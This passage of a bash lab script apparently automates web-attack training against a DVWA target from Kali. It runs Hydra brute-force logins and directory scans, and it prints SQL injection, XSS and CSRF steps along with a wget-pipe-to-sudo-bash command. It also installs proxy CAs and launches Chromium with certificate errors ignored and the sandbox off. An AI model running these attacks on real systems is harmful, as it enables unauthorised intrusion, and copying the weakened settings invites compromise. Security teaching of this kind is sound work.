	# Chromium/Firefox NSS trust store install (for $TARGET_USER)	
    print_info "Resetting and initializing Chromium's (NSS) trust store for user '${TARGET_USER}'..."
    # Remove the old DB to ensure we start from a clean, passwordless state.
    sudo -u "$TARGET_USER" rm -rf "${USER_NSS_DB}"
    sudo -u "$TARGET_USER" mkdir -p "${USER_NSS_DB}"
    # Initialize a new DB with an empty password.
    sudo -u "$TARGET_USER" certutil -d sql:"${USER_NSS_DB}" -N --empty-password

    print_info "Adding mitmproxy certificate to the new trust store..."
    # Add the certificate. This will now succeed without a prompt.
    sudo -u "$TARGET_USER" certutil -A -d sql:"${USER_NSS_DB}" -n "${CERT_NAME}" -t "TCu,Cu,Tu" -i "${MITM_CERT_PEM_PATH}"
    print_success "mitmproxy certificate installed into NSS trust store."

    # Launch Chromium with proxy preconfigured and proper flags to avoid sandbox and cert issues
    print_info "Launching Chromium with mitmproxy proxy (127.0.0.1:8080).."
    sudo -u "$TARGET_USER" nohup chromium \
      --proxy-server="http=127.0.0.1:8080;https=127.0.0.1:8080" \
      --ignore-certificate-errors \
      --user-data-dir="${USER_HOME}/.config/chromium-burp-profile" \
      --no-sandbox \
      > /dev/null 2>&1 &
    print_success "Chromium launched with background proxy and certificates installed."
    sleep 5
	#stop_if_running "chromium"
    print_info "Stop Chromium.."
    # For chromium, we use -x to match the EXACT process name, which is safe.
    if sudo pgrep -f "chromium" >/dev/null; then
        pkill -f "chromium"
        sleep 2
        print_success "Stopped existing Chromium instances."
    else
        print_info "No pre-existing Chromium process found."
    fi
    # ----------------------------------------------------------
    # Docker install block remains unchanged from your original
    if ! hash docker 2>/dev/null; then
        print_info "Docker not found, installing Docker.."
        sudo apt install -y ca-certificates curl gnupg lsb-release
        sudo mkdir -m 0755 -p /etc/apt/keyrings
        curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
        echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
        sudo apt update
        sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
        print_success "Docker installed successfully."
        print_info "Configuring Docker to use public DNS servers.."
        sudo mkdir -p /etc/docker
        echo '{ "dns": ["8.8.8.8", "8.8.4.4"] }' | sudo tee /etc/docker/daemon.json > /dev/null
        sudo systemctl daemon-reload
        sudo systemctl restart docker
        sleep 5
        print_success "Docker daemon configured and restarted."
        sudo systemctl enable docker --now
        sudo usermod -aG docker "$TARGET_USER"
        print_warn "User '$TARGET_USER' added to 'docker' group. Please LOG OUT and LOG BACK IN (or reboot) for this change to take full effect."
    else
        print_info "Docker is already installed."
    fi

    print_info "Testing Docker connectivity by pulling 'hello-world' from Docker Hub.."
    if sudo -u "$TARGET_USER" docker pull hello-world > /dev/null 2>&1; then
        print_success "Successfully pulled 'hello-world' image, confirming Docker network connectivity."
        sudo -u "$TARGET_USER" docker rmi hello-world > /dev/null 2>&1 || true
    else
        print_error "Failed to pull 'hello-world' image. Docker still has network issues."
        print_info "This indicates a fundamental problem with Docker's outbound connectivity from the Kali VM."
        exit 1
    fi
    # Update sudoers file for environment variable persistence
    print_info "Updating sudoers file for environment variable persistence.."
    if ! sudo grep -qxF 'Defaults env_keep += "DVWA_TARGET_URL"' /etc/sudoers; then
        echo 'Defaults env_keep += "DVWA_TARGET_URL"' | sudo tee -a /etc/sudoers > /dev/null
    fi
    if ! sudo grep -qxF 'Defaults env_keep += "DVWA_PHPSESSID"' /etc/sudoers; then
        echo 'Defaults env_keep += "DVWA_PHPSESSID"' | sudo tee -a /etc/sudoers > /dev/null
    fi
    print_success "Sudoers environment persistence configured."
    print_success "Kali attack tools prerequisites installation complete."
}

# Function: kali_run_web_content_scanners
# Runs dirb and gobuster against the DVWA target URL.
kali_run_web_content_scanners() {
    print_title "Running Web Content Scanners (dirb, gobuster)"

    local TARGET="${DVWA_TARGET_URL%/}/dvwa/"
    local DIRB_WORDLIST="/usr/share/wordlists/dirb/common.txt" # Common wordlist for dirb
    local GOBUSTER_WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" # Common wordlist for gobuster
    local OUTDIR="$HOME/scans/dvwa/web_content"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    # Check if the target is reachable before scanning
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/http[s]?:\/\///; s/:.*//; s/\/.+//')
    if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
        print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
        exit 1
    fi
    # Also check if the web server is responding
    if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
        print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional or accessible."
    fi

    # Run dirb scan
    print_info "Starting Dirb scan against ${TARGET}.."
    if [ -f "$DIRB_WORDLIST" ]; then
        dirb "$TARGET" "$DIRB_WORDLIST" -X .php -o "$OUTDIR/dirb_raw.txt" || print_warn "Dirb scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $DIRB_WORDLIST. Skipping dirb scan."
    fi

    # Run gobuster scan with increased threads for speed
    print_info "Starting Gobuster scan against ${TARGET}.."
    if [ -f "$GOBUSTER_WORDLIST" ]; then
        gobuster dir -u "$TARGET" -w "$GOBUSTER_WORDLIST" -x php -t 50 -o "$OUTDIR/gobuster_raw.txt" || print_warn "Gobuster scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $GOBUSTER_WORDLIST. Skipping gobuster scan."
    fi

    print_info "Processing web content scan results.."
    if [ -f "$OUTDIR/dirb_raw.txt" ]; then
        grep '^+' "$OUTDIR/dirb_raw.txt" | awk '{print $2}' | sed "s|$TARGET||" | sort -u > "$OUTDIR/dirb_paths.txt" || true
    else
        print_warn "Dirb raw output not found, cannot process dirb paths."
    fi

    if [ -f "$OUTDIR/gobuster_raw.txt" ]; then
        grep -E '^/' "$OUTDIR/gobuster_raw.txt" | awk '{print $1}' | sort -u > "$OUTDIR/gobuster_paths.txt" || true
    else
        print_warn "Gobuster raw output not found, cannot process gobuster paths."
    fi

    if [ -f "$OUTDIR/dirb_paths.txt" ] && [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        comm -12 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/common_paths.txt" || true
        comm -23 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/only_in_dirb.txt" || true
        comm -13 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/only_in_gobuster.txt" || true
        print_info "Common paths found by dirb and gobuster saved to $OUTDIR/common_paths.txt"
    else
        print_warn "Cannot compare paths, one or both path files missing."
    fi

    print_success "Web content scan results saved in $OUTDIR"
    print_info "Review files in $OUTDIR for discovered web objects : directories and files."

    print_info "Summary of discovered paths:"
    if [ -f "$OUTDIR/dirb_paths.txt" ]; then
        COUNT_DIRB=$(wc -l < "$OUTDIR/dirb_paths.txt")
        echo "  Dirb found:    $COUNT_DIRB paths"
        head -5 "$OUTDIR/dirb_paths.txt" | sed 's|^|    |'
    else
        echo "  Dirb results file missing"
    fi

    if [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        COUNT_GOBUSTER=$(wc -l < "$OUTDIR/gobuster_paths.txt")
        echo "  Gobuster found: $COUNT_GOBUSTER paths"
        head -5 "$OUTDIR/gobuster_paths.txt" | sed 's|^|    |'
    else
        echo "  Gobuster results file missing"
    fi

    if [ -f "$OUTDIR/common_paths.txt" ]; then
        COUNT_COMMON=$(wc -l < "$OUTDIR/common_paths.txt")
        echo "  Common paths:  $COUNT_COMMON paths"
        head -5 "$OUTDIR/common_paths.txt" | sed 's|^|    |'
    else
        echo "  Common paths file missing"
    fi

    echo

    print_info "Detailed results saved in:"
    echo "  - $OUTDIR/dirb_paths.txt"
    echo "  - $OUTDIR/gobuster_paths.txt"
    echo "  - $OUTDIR/common_paths.txt"

    if [ -f "$OUTDIR/dirb_paths.txt" ] && [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        print_info "Unique paths saved in:"
        echo "  - $OUTDIR/only_in_dirb.txt"
        echo "  - $OUTDIR/only_in_gobuster.txt"
    fi
}

# Function: kali_demonstrate_brute_force
# Provides instructions and sample commands for brute-force attacks using Burp Suite and Hydra.
kali_demonstrate_brute_force() {
    print_title "Brute-Force Attack Demonstration"

    local TARGET="${DVWA_TARGET_URL%/}"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    local ROCKYOU_WORDLIST="/usr/share/wordlists/rockyou.txt.gz"
    local FALLBACK_WORDLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
    local DVWA_BRUTE_FORCE_PATH="/dvwa/vulnerabilities/brute/index.php"
    local OUTDIR="$HOME/scans/dvwa/brute_force"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "1. Prepare DVWA (from Kali browser):"
    print_info "   - Log into DVWA as 'admin' / 'password'."
    print_info "   - Navigate to 'DVWA Security' and set the 'Security Level' to 'Low'."
    print_info "   - Click 'Submit'."
    print_warn "   Remember to note your PHPSESSID cookie value from browser developer tools after logging in."
    echo ""

    # Ensure DVWA_PHPSESSID is set either from environment or prompt
    if [ -z "$DVWA_PHPSESSID" ]; then
        echo -ne "Enter DVWA PHPSESSID (e.g., 534uuj0t5702leo6gmot7b5c76, 15s timeout): "
        if ! read -t 15 DVWA_PHPSESSID < /dev/tty; then
            DVWA_PHPSESSID=""
        fi
        # Removed the problematic 'echo' here, now handled by the outer check if needed.
    fi
    
    # This check now correctly uses the local DVWA_PHPSESSID, which holds either the env var value or user input
    if [ -z "$DVWA_PHPSESSID" ]; then
        print_error "DVWA PHPSESSID is required for the Hydra command. Aborting brute-force demo."
        exit 1
    else
        print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    fi
    echo ""

    print_info "3. Running Hydra brute force attack (CLI automation):"
    local WORDLIST_TO_USE=""
    if [ -f "$ROCKYOU_WORDLIST" ]; then
        print_info "Using rockyou.txt.gz wordlist: ${ROCKYOU_WORDLIST}"
        WORDLIST_TO_USE="$ROCKYOU_WORDLIST"
    elif [ -f "$FALLBACK_WORDLIST" ]; then
        print_warn "rockyou.txt.gz not found. Falling back to common passwords: ${FALLBACK_WORDLIST}."
        WORDLIST_TO_USE="$FALLBACK_WORDLIST"
    else
        print_error "No suitable password wordlist found. Please install rockyou.txt.gz or seclists."
        exit 1
    fi

    local HYDRA_CMD="hydra -l admin -P \"${WORDLIST_TO_USE}\" \"${TARGET_HOST}\" http-get-form '${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect.'"

    # Hydra command updated to http-get-form with PHPSESSID
    print_info "Executing command: ${HYDRA_CMD}"
    print_info "   - '-l admin' specifies the username 'admin'."
    print_info "   - '-P' specifies the password list (rockyou.txt.gz or fallback)."
    print_info "   - '${TARGET_HOST}' is the IP/hostname of your DVWA VM."
    print_info "   - 'http-get-form' targets a GET login form."
    print_info "   - '${DVWA_BRUTE_FORCE_PATH}:username=admin&password=^PASS^&Login=Login' defines the target path and GET data."
    print_info "   - 'H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low' injects the session cookie and security level into the HTTP header."
    print_info "   - 'F=Username and/or password incorrect.' is the failure string to detect failed logins."
    print_info "Hydra output will be saved to ${OUTDIR}/hydra_brute_force.log"
    echo ""

    local HYDRA_EXIT_STATUS=0

    # Temporarily disable 'set -e' so script doesn't exit if hydra fails
    set +e
    print_info "Running Hydra. This may take some time depending on the wordlist size.."
    hydra -l admin -P "${WORDLIST_TO_USE}" "${TARGET_HOST}" http-get-form "${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect." 2>&1 | tee -a "${OUTDIR}/hydra_brute_force.log"
    HYDRA_EXIT_STATUS=${PIPESTATUS[0]} # Capture hydra's exit status
    set -e || true # Re-enable 'set -e'

    if [ "$HYDRA_EXIT_STATUS" -eq 0 ]; then
        print_success "Hydra brute force attack completed successfully. Check ${OUTDIR}/hydra_brute_force.log for full results."
    else
        print_error "Hydra brute force attack failed or encountered errors (exit code: ${HYDRA_EXIT_STATUS}). Check ${OUTDIR}/hydra_brute_force.log for details."
        # Don't exit here, allow Burp Suite instructions to still be shown
    fi
    echo ""

    # The instructions below are updated to use the pre-configured Chromium browser.
    print_info "4. Burp Suite configuration (manual steps):"
    print_info "   - Start Burp Suite from the Kali menu (Community Edition is sufficient)."
    print_info "   - In a new terminal, launch the pre-configured browser with the command:"
    print_info "     \`wget -qO- <script_url> | sudo bash -s chromium\`"
    
    print_info "\n   --- Verifying the Proxy ---"
    print_info "   - In Burp, go to the 'Proxy' -> 'Intercept' tab and ensure the button says 'Intercept is off'."
    print_info "   - Now, go to the 'Proxy' -> 'HTTP history' tab."
    print_info "   - In the Chromium browser, navigate to the DVWA brute force page: ${TARGET}${DVWA_BRUTE_FORCE_PATH}"
    print_info "   - You should see the traffic for the page loading in the 'HTTP history' tab. This confirms the proxy is working."

    print_info "\n   --- Capturing the Request for Intruder ---"
    print_info "   - Go back to the 'Proxy' -> 'Intercept' tab and click the button so it says 'Intercept is on'."
    print_info "   - In Chromium, enter a test username/password (e.g., 'admin'/'test') and click 'Login'."
    print_info "   - The browser will now hang, and the request will be captured and held in the 'Intercept' tab."
    print_info "   - Right-click anywhere in the request text box and choose 'Send to Intruder'."
    print_info "   - IMPORTANT: Click the 'Intercept is on' button again so it says 'Intercept is off'. This will let your browser work normally again."

    print_info "\n   --- Configuring the Attack ---"
    print_info "   - Go to the 'Intruder' tab. In the 'Positions' sub-tab, click the 'Clear §' button on the right."
    print_info "   - In the request, find the line for the password (e.g., password=test). Highlight only the value 'test', then click 'Add §'."
    print_info "   - Go to the 'Payloads' sub-tab. Under 'Payload Options [Simple list]', click 'Load...'."
    print_info "   - Select a wordlist, e.g., /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt, and click 'Open'."
    print_info "   - Click the 'Start attack' button in the top-right."

    print_info "\n   --- Analyzing the Results ---"
    print_info "   - In the new 'Intruder attack' window, wait for requests to be processed."
    print_info "   - Click on the 'Length' column header to sort the results. The successful login will have a different response length than all the failed attempts."

    print_success "Brute-force attack instructions provided. Manual execution and observation are required for Burp Suite."
}

# Function: kali_launch_burp_chromium
# Checks if Burp is running, downloads its cert, installs it, and launches a pre-configured Chromium.
kali_launch_burp_chromium() {
    print_title "Launching Chromium Configured for Burp Suite"

    print_warn "This function requires two things have been done FIRST:"
    print_warn "  1. You have successfully run the 'kali_prereqs' command at least once."
    print_warn "  2. You have MANUALLY started the Burp Suite desktop application and its proxy is active."
    print_info "This script will now proceed to configure and launch a proxied Chromium browser."
    echo ""

    print_info "Checking for Burp Suite's proxy listener on 127.0.0.1:8080..."
    if ! nc -z 127.0.0.1 8080; then
        print_error "Burp Suite proxy listener was not found on 127.0.0.1:8080."
        print_info "Please ensure Burp Suite is running and its proxy is enabled before using this command."
        exit 1
    fi
    print_success "Burp Suite proxy listener detected."

    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    if [ -z "$TARGET_USER" ]; then
        print_error "Could not determine target user. Exiting."
        exit 1
    fi
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    
    # We kill by PROCESS NAME ('chromium'), not by command-line args, to avoid self-termination.
    print_info "Checking for and stopping any existing Chromium processes..."
    if pgrep -x "chromium" >/dev/null; then
        print_info "Found running 'chromium' process(es). Attempting graceful shutdown..."
        pkill -x "chromium"
        sleep 2
        if pgrep -x "chromium" >/dev/null; then
            print_warn "Chromium still running, sending SIGKILL."
            pkill -9 -x "chromium"
        fi
        print_success "Stopped existing Chromium instances."
    else
        print_info "No pre-existing Chromium process found."
    fi

    local BURP_CERT_DER_PATH="${USER_HOME}/burpsuite_cert.der"
    local BURP_CERT_PEM_PATH="${USER_HOME}/burpsuite_cert.pem"
    local CERT_NAME="PortSwigger CA"
    local USER_NSS_DB="${USER_HOME}/.pki/nssdb"

    print_info "Downloading Burp Suite certificate from http://127.0.0.1:8080/cert..."
    if ! sudo -u "$TARGET_USER" curl -s -o "${BURP_CERT_DER_PATH}" http://127.0.0.1:8080/cert; then
        print_error "Failed to download Burp certificate. Is the proxy running correctly?"
        exit 1
    fi

    print_info "Converting certificate from DER to PEM format..."
    sudo -u "$TARGET_USER" openssl x509 -inform DER -in "${BURP_CERT_DER_PATH}" -out "${BURP_CERT_PEM_PATH}"

    print_info "Installing certificate into Chromium's (NSS) trust store for user '${TARGET_USER}'..."
    sudo -u "$TARGET_USER" mkdir -p "${USER_NSS_DB}"
    
    if ! sudo -u "$TARGET_USER" certutil -d sql:"${USER_NSS_DB}" -L | grep -q "${CERT_NAME}"; then
      sudo -u "$TARGET_USER" certutil -d sql:"${USER_NSS_DB}" -N --empty-password || true
      sudo -u "$TARGET_USER" certutil -A -d sql:"${USER_NSS_DB}" -n "${CERT_NAME}" -t "TCu,Cu,Tu" -i "${BURP_CERT_PEM_PATH}"
      print_success "Burp certificate successfully installed into NSS trust store."
    else
      print_info "Burp certificate is already present in the NSS trust store."
    fi

    sudo -u "$TARGET_USER" rm -f "${BURP_CERT_DER_PATH}" "${BURP_CERT_PEM_PATH}"

    print_info "Launching Chromium with Burp proxy enabled..."
    sudo -u "$TARGET_USER" nohup chromium \
      --proxy-server="http=127.0.0.1:8080;https=127.0.0.1:8080" \
      --user-data-dir="${USER_HOME}/.config/chromium-burp-profile" \
      --no-sandbox \
      > /dev/null 2>&1 &
    
    sleep 3
    print_success "Chromium has been launched and is configured to proxy through Burp Suite."
    print_info "You can now begin your manual testing."
}

# Function: kali_demonstrate_vuln_scanners
# Provides guidance for using OWASP ZAP (Docker + AF) or OpenVAS for vulnerability scanning.
kali_demonstrate_vuln_scanners() {
    print_title "Vulnerability Scanning Demonstration (OWASP ZAP / OpenVAS)"

    if ! command -v docker &> /dev/null; then
        print_error "Docker is not installed. Please run 'kali_prereqs' first or install Docker manually."
        exit 1
    fi

    local TARGET="${DVWA_TARGET_URL%/}"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    
#     local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
#     if [ -z "$TARGET_USER" ]; then
#         print_error "Could not determine target user for file ownership. Exiting."
#         exit 1
#     fi
#     local USER_HOME=$(eval echo "~${TARGET_USER}")
#     local OUTDIR="${USER_HOME}/scans/dvwa/vuln_reports"
    
#     sudo mkdir -p "$OUTDIR"
#     sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"
#     print_info "Output directory created and owned by '$TARGET_USER': $OUTDIR"


#     print_info "Targeting DVWA VM at: ${TARGET}"

#     if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
#         print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
#         exit 1
#     fi
#     if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
#         print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional. Proceeding, but verify."
#     fi

#     print_info "--- OWASP ZAP (Docker Automation Framework) Scan ---"
    
#     # --- Critical Check: Docker Group Membership ---
#     print_info "Checking if user '$TARGET_USER' is in the 'docker' group in the current session.."
#     if ! id -nG "$TARGET_USER" | grep -qw "docker"; then
#         print_error "User '$TARGET_USER' is NOT in the 'docker' group in the current session."
#         print_error "Please LOG OUT and LOG BACK IN (or reboot) your Kali VM after running 'kali_prereqs'."
#         print_info "Skipping ZAP Docker scan."
#         local SKIP_ZAP_SCAN="true"
#     else
#         print_success "User '$TARGET_USER' is in the 'docker' group."
#         local SKIP_ZAP_SCAN="false"
#     fi
#     # --- End Critical Check ---

#     if [ "$SKIP_ZAP_SCAN" == "false" ]; then
#         print_info "1. Prepare DVWA for ZAP Scan (if not already done):"
#         print_info "   - Ensure DVWA is running and accessible at ${TARGET}."
#         print_info "   - Ensure the database has been created via the '/setup.php' page."
#         print_info "   - Ensure the security level is set to 'Low' for this scan."
#         echo ""

#         local DVWA_USER="admin"
#         local DVWA_PASS="password"

#         echo -ne "\e[96mEnter DVWA Username (default: admin, 15s timeout): \e[0m"
#         local USER_INPUT_USERNAME
#         if read -t 15 USER_INPUT_USERNAME < /dev/tty && [ -n "$USER_INPUT_USERNAME" ]; then
#             DVWA_USER="$USER_INPUT_USERNAME"
#         fi
#         echo
#         print_info "Using DVWA Username: ${DVWA_USER}"

#         echo -ne "\e[96mEnter DVWA Password for ${DVWA_USER} (default: password, 15s timeout): \e[0m"
#         local USER_INPUT_PASSWORD
#         if read -t 15 -s USER_INPUT_PASSWORD < /dev/tty && [ -n "$USER_INPUT_PASSWORD" ]; then
#             DVWA_PASS="$USER_INPUT_PASSWORD"
#         fi
#         echo
#         print_info "Using DVWA Password: (hidden)"
#         echo ""

#         local AF_PLAN_URL="https://github.com/zaproxy/community-scripts/raw/main/other/af-plans/FullScanDvwaAuth.yaml"
#         local AF_PLAN_ORIGINAL="${OUTDIR}/FullScanDvwaAuth.original.yaml"
#         local AF_PLAN_MODIFIED="${OUTDIR}/FullScanDvwaAuth.modified.yaml"
#         local ZAP_REPORT_FILE="${OUTDIR}/zap_full_scan_report.html"
#         local ZAP_LOG_FILE="${OUTDIR}/zap_full_scan.log"
        
#         print_info "Downloading ZAP Automation Framework plan for authenticated DVWA scan.."
#         sudo -u "$TARGET_USER" wget -q "$AF_PLAN_URL" -O "$AF_PLAN_ORIGINAL" || { print_error "Failed to download ZAP AF plan from ${AF_PLAN_URL}."; exit 1; }
#         print_success "ZAP AF plan downloaded to ${AF_PLAN_ORIGINAL}."

#         print_info "Modifying ZAP AF plan with target URL and credentials.."
#         sudo -u "$TARGET_USER" cp "$AF_PLAN_ORIGINAL" "$AF_PLAN_MODIFIED"
        
#         # --- CORRECT SED REPLACEMENTS FOR THE ACTUAL YAML FILE ---
#         # Replace the hardcoded context URL
#         sudo -u "$TARGET_USER" sed -i 's|url: "http://localhost:4280"|url: "'"$TARGET"'"|' "$AF_PLAN_MODIFIED"
#         # Replace the hardcoded login URLs
#         sudo -u "$TARGET_USER" sed -i 's|loginUrl: "http://localhost:4280/login.php"|loginUrl: "'"$TARGET"'/login.php"|' "$AF_PLAN_MODIFIED"
#         sudo -u "$TARGET_USER" sed -i 's|loginPageUrl: "http://localhost:4280/login.php"|loginPageUrl: "'"$TARGET"'/login.php"|' "$AF_PLAN_MODIFIED"
#         # Replace the hardcoded credentials
#         sudo -u "$TARGET_USER" sed -i 's|username: "admin"|username: "'"$DVWA_USER"'"|' "$AF_PLAN_MODIFIED"
#         sudo -u "$TARGET_USER" sed -i 's|password: "password"|password: "'"$DVWA_PASS"'"|' "$AF_PLAN_MODIFIED"
#         # Replace the hardcoded report file name with the correct path inside the container
#         sudo -u "$TARGET_USER" sed -i 's|reportFile: "ZAP-Report"|reportFile: "/zap/wrk/'"$(basename "$ZAP_REPORT_FILE")"'"|' "$AF_PLAN_MODIFIED"
#         # --- END OF CORRECT SED REPLACEMENTS ---
        
#         print_success "ZAP AF plan modified successfully."

#         print_info "Running OWASP ZAP Docker container with Automation Framework plan (this will take time).."
#         print_info "Docker output will be logged to ${ZAP_LOG_FILE}."

#         # ZAP Proxy Payloads
#         # http://10.0.31.50/dvwa/login.php 
#         # username=admin&password=password&Login=Login&user_token=df02d45cb851cf10968e024dbbb882af        
#         # username={%username%}&password={%password%}&user_token={%user_token%}&Login=Login
#         # GET http://10.0.31.50/dvwa/vulnerabilities/csrf/test_credentials.php?Login=Login&password=password&username=admin
#         # GET http://10.0.31.50/dvwa/vulnerabilities/xss_r/?name=%3C%2Fpre%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cpre%3E
#         # GET http://10.0.31.50/dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%271%27+--+&Submit=Submit
#         # GET http://10.0.31.50/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit+AND+1%3D1+--+
#         # https://stackoverflow.com/questions/68704818/zap-spider-cant-find-form-request-on-dvwa
        
#         local CONTAINER_IMAGE="zaproxy/zap-stable"
#         local AF_PLAN_BASENAME=$(basename "$AF_PLAN_MODIFIED")

#         set +e
#         sudo -u "$TARGET_USER" bash <<EOF > "${ZAP_LOG_FILE}" 2>&1
# docker run --rm \
#   -v "${OUTDIR}:/zap/wrk:rw" \
#   -v "${AF_PLAN_MODIFIED}:/zap/zap-automation-framework/${AF_PLAN_BASENAME}" \
#   "${CONTAINER_IMAGE}" \
#   zap.sh -cmd -addonupdate -addoninstall sqliplugin -autorun "/zap/zap-automation-framework/${AF_PLAN_BASENAME}"
# EOF
#         local DOCKER_CMD_EXIT_CODE=$?
#         set -e
        
#         if [ "$DOCKER_CMD_EXIT_CODE" -eq 0 ]; then
#             print_success "OWASP ZAP Docker Automation Framework scan completed with exit code 0."
#         else
#             print_warn "OWASP ZAP Docker AF scan command returned non-zero exit code ($DOCKER_CMD_EXIT_CODE). Check ${ZAP_LOG_FILE} for details."
#         fi

#         if sudo -u "$TARGET_USER" [ -f "$ZAP_REPORT_FILE" ]; then
#             print_success "OWASP ZAP Automation Framework scan completed. Report generated at ${ZAP_REPORT_FILE}."
#             print_info "Review the ZAP report for vulnerabilities."
#         else
#             print_error "OWASP ZAP report not found at ${ZAP_REPORT_FILE}. Scan might have failed."
#             print_info "Check logs in ${ZAP_LOG_FILE} for details."
#         fi
#         echo ""
#     fi

    print_info "--- OWASP ZAP (Manual GUI-Based Scan Guide) ---"
    print_info "The following steps guide you through a targeted manual scan using the ZAP Desktop UI."
    print_info "This is a great way to understand how scanners identify specific vulnerabilities."

    print_info "\n   Part A: Initial Setup and SQL Injection Test"
    print_info "   1.  Launch the OWASP ZAP desktop application."
    print_info "   2.  Go to 'Tools' -> 'Manage Add-ons' (marketplace icon). In the 'Marketplace' tab, search for 'sql' and install the 'Advanced SQL Injection' add-on."
    print_info "   3.  After installation, go to the 'Installed' tab and click the 'Update All' button."
    print_info "   4.  Wait for all add-ons to download and update completely (100%)."
    print_info "   5.  Once updates are finished, close and restart OWASP ZAP to apply all changes."
    print_info "   6.  Configure your web browser to use ZAP as a proxy (the pre-configured Chromium from 'kali_prereqs' works perfectly)."
    print_info "   7.  In your proxied browser, log in to DVWA at ${TARGET}/dvwa. Set the security level to 'Low'."
    print_info "   8.  Navigate to the 'SQL Injection' vulnerability page."
    print_info "   9.  Submit a basic SQLi payload, e.g., \`1' or '1'='1' -- #\`. This 'primes' ZAP by ensuring the target URL appears in its Site Tree."
    print_info "   10. In ZAP, navigate the 'Sites' tab to find the request: '${TARGET_HOST} > dvwa > vulnerabilities > sqli > GET:/(Submit,id)'."
    print_info "   11. Right-click this specific GET request and select 'Attack' -> 'Active Scan'. Review the policies and click 'Start Scan'."
    print_info "   12. Once the scan completes, check the 'Alerts' tab at the bottom. You should find a high-confidence 'SQL Injection' alert."

    print_info "\n   Part B: Reflected Cross-Site Scripting (XSS) Attack"
    print_info "   1.  In your proxied browser, navigate to the 'XSS (Reflected)' vulnerability page."
    print_info "   2.  Submit a basic XSS payload in the input field, e.g., \`<script>alert(1)</script>\`."
    print_info "   3.  In ZAP's 'Sites' tab, find the new request: '${TARGET_HOST} > dvwa > vulnerabilities > xss_r > GET:/(name)'."
    print_info "   4.  Right-click this new GET request and again select 'Attack' -> 'Active Scan'."
    print_info "   5.  When the scan finishes, check the 'Alerts' tab. You should now see a 'Cross Site Scripting (Reflected)' alert."
    echo ""

    print_info "\n   Part C: Cross-Site Request Forgery (CSRF) Attack"
    print_info "   1.  In your proxied browser, navigate to the 'CSRF' vulnerability page."
    print_info "   2.  Enter a new password (e.g., 'newpass') in both fields and click the 'Change' button."
    print_info "   3.  In ZAP's 'Sites' tab, find the new request: '${TARGET_HOST} > dvwa > vulnerabilities > csrf > GET:(Change,password_conf,password_new)'."
    print_info "   4.  Right-click this new GET request and again select 'Attack' -> 'Active Scan'."
    print_info "   5.  When the scan finishes, check the 'Alerts' tab. You should now see a 'Cross-Site Request Forgery' or 'Absence of Anti-CSRF Tokens' alert."
    echo ""
        
    print_info "--- OpenVAS (GVM) Setup and Scan (More for Network/System Vulnerabilities) ---"
    print_info "   - OpenVAS (now GVM) is a powerful network vulnerability scanner but requires significant setup and can consume considerable system resources and time."
    print_info "   - If GVM is not set up, run 'sudo gvm-setup' in a terminal. Follow all prompts."
    print_info "   - Access the GVM web interface (usually https://127.0.0.1:9392 from Kali) using the credentials provided during setup."
    print_info "   - Create a target for your DVWA VM's IP address (e.g., ${TARGET_HOST})."
    print_info "   - Create and run a scan task."
    print_info "   - Once the scan is complete, view and export the report."
    echo ""

    print_info "--- Manual Vulnerability Confirmation and Analysis ---"
    print_info "   - For each 'important' finding listed in your ZAP or OpenVAS report (e.g., SQL Injection, XSS, CSRF):"
    print_info "     - Manually attempt to reproduce and confirm the vulnerability."
    print_info "     - Analyze the DVWA source code to understand why the vulnerability exists."
    print_info "     - Document your findings."

    print_success "Vulnerability scanning guidance and ZAP automated scan provided. Manual analysis and OpenVAS setup are still crucial."
}

# Function: kali_demonstrate_sqlmap_sqli
